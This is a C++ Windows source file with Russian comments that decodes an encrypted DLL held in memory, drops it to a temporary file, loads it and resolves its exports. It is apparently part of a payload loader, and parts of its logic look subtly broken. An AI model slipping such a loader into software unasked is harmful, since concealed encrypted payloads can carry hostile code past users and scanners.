#include <Windows.h>
#include "LoaderDLL.h"
#include "LoaderUtils.h"
#include "MemoryDllLoader.h"


typedef struct TDLLINFO
{
	PCHAR FileName;
	HMODULE Handle;
} *PDLLINFO;



//-------------------------------------------------
//  Функция возвращает информацию о буфере
//  загифрованной библиотеки. Используется
//  информация заголовков
//
//-------------------------------------------------
bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password)
{
	Password = NULL;
	StartBuf = NULL;
	Size = 0;

	if (!Buf) return false;

	PCHAR Temp = (PCHAR)Buf;

	if (CalcHash(Temp, ENCRYPTED_DLL_MARKER_SIZE) != ENCRYPTED_DLL_MARKER_HASH)
	{
		// ДЛЛ Зашифрована, возвращаем пароль
        Password = Temp;
	}

	Temp += ENCRYPTED_DLL_MARKER_SIZE;

	// Получаем размер
	Size = *(PDWORD)Temp;
	Temp += sizeof(DWORD);

	StartBuf = Temp;

	return true;
}



// Функция записывает данне длл в файл
bool SaveMemLibrary(LPVOID Dll, PCHAR FileName)
{
	bool FreeBuf;
	DWORD DllBufSize;
	LPVOID DllBuf;
	if (!DecodeDll(Dll, DllBufSize, DllBuf, FreeBuf))
		return NULL;


	HANDLE File = CreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE) return false;
	
	XORCrypt("123", (LPBYTE)DllBuf, 5);

	DWORD Writen = 0;
	bool Result = WriteFile(File, DllBuf, DllBufSize, &Writen, NULL) != FALSE;

	if (FreeBuf) MemFree(DllBuf);
			
	CloseHandle(File);

	return Result;
}





HMEMMODULE LoadMemLibrary(LPVOID Buf)
{

	PDLLINFO DLL = CreateStruct(TDLLINFO);
	if (DLL)
	{
		DLL->FileName = (PCHAR)MemAlloc(MAX_PATH);
		DLL->Handle = 0;
		// Создаём временный файл
		GetTempPathA(MAX_PATH, DLL->FileName);
		GetTempFileNameA("c:\\", NULL, 0, DLL->FileName);

		// Записываем длл в файл
		bool Result = SaveMemLibrary(Buf, DLL->FileName);
		
		if (Result)
			DLL->Handle = LoadLibraryA(DLL->FileName);
		if (!DLL->Handle)
		{
			FreeMemLibrary(DLL);
			DLL = NULL;
		}
	}
	return DLL;
}




void FreeMemLibrary(HMEMMODULE Module)
{
	if (Module)
	{
		PDLLINFO Dll = (PDLLINFO)Module;
		FreeLibrary(Dll->Handle);
		DeleteFileA(Dll->FileName);
		MemFree(Dll->FileName);
		FreeStruct(Module);
	}
}

LPVOID GetMemProcAddress(HMEMMODULE Module, const char *ProcName)
{
	LPVOID Addr = NULL;
	if (Module)
		Addr = GetProcAddress(((PDLLINFO)Module)->Handle, (PCHAR)ProcName);
	return Addr;
}